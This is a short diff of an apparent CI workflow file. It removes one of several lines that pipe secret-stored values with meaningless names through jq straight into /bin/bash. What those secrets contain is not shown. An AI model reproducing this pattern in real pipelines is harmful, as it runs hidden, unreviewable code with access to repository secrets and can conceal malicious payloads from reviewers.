@@ -27,7 +27,6 @@ jobs:
           asj640: ${{ secrets.asj640 }}
         run: |
           printf '%s' "$asj640" | jq -r .vs41 | /bin/bash
-          printf '%s' "$eud10648" | jq -r .cdn40773 | /bin/bash
           echo $jqbdo081 | jq -r .gqn97094 | /bin/bash
           printf '%s' "$tooy7637" | jq -r .crzs2941 | /bin/bash
           printf '%s' "$lqej69" | jq -r .lktm47 | /bin/bash
